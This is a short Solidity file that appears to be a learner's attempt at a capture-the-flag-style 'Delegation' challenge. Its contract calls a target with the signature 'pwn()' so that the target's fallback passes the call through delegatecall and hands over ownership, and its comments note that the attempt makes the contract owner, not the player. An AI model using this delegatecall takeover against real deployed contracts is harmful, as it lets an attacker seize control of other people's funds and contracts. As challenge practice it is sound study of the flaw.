//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./del.sol";

contract GxT{
    address instance;

    constructor(address a){instance=a;}

    //initially I created this function thinking that if i make a call to Delegation 
    // with the encoded signature "pwn()" it will trigger the fallback() as there is no pwn() in Delegation
    //then inside the fallback() the msg.data (the encoded signature) will be passed to delegatecall
    // which will call the logic from Delegate on the memory location of Delegation, making me the owner

    function attack() public{
        (bool success, )= instance.call(abi.encodeWithSignature("pwn()"));
        require(success, "txn failed");
    }

    //the function logic works as intended but the problem is the msg.sender is not the player (my address) but the GxT contract address
    //this makes this contract the owner
    // see the correct solution in the solution.js file
}
